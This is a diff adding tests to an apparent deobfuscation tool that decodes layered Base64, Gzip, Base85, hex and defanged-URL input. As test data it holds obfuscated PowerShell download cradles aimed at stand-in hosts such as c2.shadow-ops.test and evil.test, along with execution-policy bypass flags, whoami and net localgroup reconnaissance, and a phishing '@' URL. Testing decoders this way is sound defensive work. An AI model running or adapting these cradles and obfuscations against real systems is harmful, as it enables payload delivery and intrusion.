@@ -249,3 +249,94 @@ test('Hex: \\xNN and \\uNNNN escape sequences', async () => {
   assert.equal(rUniEsc.ok, true);
   assert.equal(rUniEsc.output, 'PowerShell');
 });
+
+/* ------------------------------------------------------------------ */
+/* Hard Obfuscation & Multi-Layer Tests                               */
+/* ------------------------------------------------------------------ */
+
+test('PowerShell: backtick/caret escapes, concatenated vars & multi-layer Gzip cradle', async () => {
+  const secret = "IEX (New-Object Net.WebClient).DownloadString('https://c2.shadow-ops.test/stage2.ps1')";
+  const gz = zlib.gzipSync(Buffer.from(secret)).toString('base64');
+  const outer = 'powershell.exe -NoP -W Hidden -enc ' + utf16b64(`$ms=New-Object IO.MemoryStream(,[Convert]::FromBase64String('${gz}'));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($ms,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()`);
+  const rOuter = await decode(outer);
+  assert.equal(rOuter.ok, true);
+  assert.equal(rOuter.output, secret);
+
+  const backtickPs = 'p`o`w`e`r`s`h`e`l`l.exe -N`oP -e`\nn`c ' + utf16b64('Invoke-WebRequest http://evil.test/a.exe');
+  assert.equal((await decode(backtickPs)).output, 'Invoke-WebRequest http://evil.test/a.exe');
+
+  const caretCmd = 'cmd /c p^o^w^e^r^s^h^e^l^l -e^n^c ' + utf16b64('whoami /groups');
+  assert.equal((await decode(caretCmd)).output, 'whoami /groups');
+
+  const b64Part = utf16b64('Start-Process calc.exe');
+  const concatCall = `[System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(('${b64Part.slice(0, 12)}'+'${b64Part.slice(12)}')))`;
+  assert.equal((await decode(concatCall)).output, 'Start-Process calc.exe');
+});
+
+test('Base64: URL-encoded %2B/%2F/%3D and zero-width Unicode chars', async () => {
+  const urlEncB64 = encodeURIComponent(utf8b64('?>?>?a+b/c'));
+  const rUrl = await decode(urlEncB64);
+  assert.equal(rUrl.ok, true);
+  assert.equal(rUrl.mode, 'base64');
+  assert.equal(rUrl.output, '?>?>?a+b/c');
+
+  const zwB64 = utf8b64('Invoke-Expression "hostname"').replace(/(.{5})/g, '$1\u200B');
+  const rZw = await decode(zwB64);
+  assert.equal(rZw.ok, true);
+  assert.equal(rZw.output, 'Invoke-Expression "hostname"');
+  assert.ok(rZw.warnings.some((w) => /zero-width/i.test(w)));
+});
+
+test('Base85: Multi-line, truncated <~, zero-punctuation RFC1924 & nested Base64', async () => {
+  const multilineA85 = '87cURD]i,"Ebo80\n87cURD]i,"Ebo80';
+  const rMl = await decode(multilineA85);
+  assert.equal(rMl.ok, true);
+  assert.equal(rMl.mode, 'base85');
+  assert.equal(rMl.output, 'Hello World!Hello World!');
+
+  const truncA85 = '<~87cURD]i,"Ebo7';
+  const rTr = await decode(truncA85);
+  assert.equal(rTr.ok, true);
+  assert.equal(rTr.output, 'Hello World');
+
+  // RFC1924 encoding of "http://x" -> XmoUNIxjDH (zero punctuation characters)
+  const rZeroPunct = await decode('XmoUNIxjDH');
+  assert.equal(rZeroPunct.ok, true);
+  assert.equal(rZeroPunct.mode, 'base85');
+  assert.equal(rZeroPunct.output, 'http://x');
+});
+
+test('Hex: Single 0x literal, [byte[]] array, mixed \\u+\\x escapes, UTF-8 \\xNN & Gzip hex', async () => {
+  const rSingle0x = await decode('0x' + Buffer.from('powershell -nop -exec bypass').toString('hex'));
+  assert.equal(rSingle0x.ok, true);
+  assert.equal(rSingle0x.mode, 'hex');
+  assert.equal(rSingle0x.output, 'powershell -nop -exec bypass');
+
+  const rByteArr = await decode('[byte[]](0x77,0x68,0x6f,0x61,0x6d,0x69,0x20,0x2f,0x61,0x6c,0x6c)');
+  assert.equal(rByteArr.ok, true);
+  assert.equal(rByteArr.output, 'whoami /all');
+
+  const rMixedEsc = await decode('\\u0049\\x45\\x58\\u0020(\\x27https://\\xc3\\xa9vil.test/a\\x27)');
+  assert.equal(rMixedEsc.ok, true);
+  assert.equal(rMixedEsc.output, "IEX ('https://\u00e9vil.test/a')");
+
+  const hexGz = zlib.gzipSync(Buffer.from('whoami /priv && net localgroup administrators')).toString('hex');
+  const rHexGz = await decode(hexGz);
+  assert.equal(rHexGz.ok, true);
+  assert.equal(rHexGz.mode, 'hex');
+  assert.equal(rHexGz.output, 'whoami /priv && net localgroup administrators');
+});
+
+test('Multi-layer chain: SafeLinks + Hex IP + @ phish, and Hex -> Base64 -> Defanged URL', async () => {
+  const nestedSafe = 'hxxps[:]//nam01[.]safelinks[.]protection[.]outlook[.]com/?url=https%253A%252F%252Flogin.microsoft.com%25400x7f000001%252Fauth';
+  const rSafe = await decode(nestedSafe);
+  assert.equal(rSafe.ok, true);
+  assert.ok(rSafe.output.includes('https://login.microsoft.com@127.0.0.1/auth'));
+  assert.ok(rSafe.warnings.some((w) => /Phishing "@" trick detected/.test(w)));
+  assert.ok(rSafe.warnings.some((w) => /127\.0\.0\.1/.test(w)));
+
+  const triple = utf8b64(Buffer.from('hxxps[:]//drop[.]evil[.]test/stager%2Ebin').toString('hex'));
+  const rTriple = await decode(triple);
+  assert.equal(rTriple.ok, true);
+  assert.equal(rTriple.output, 'https://drop.evil.test/stager.bin');
+});
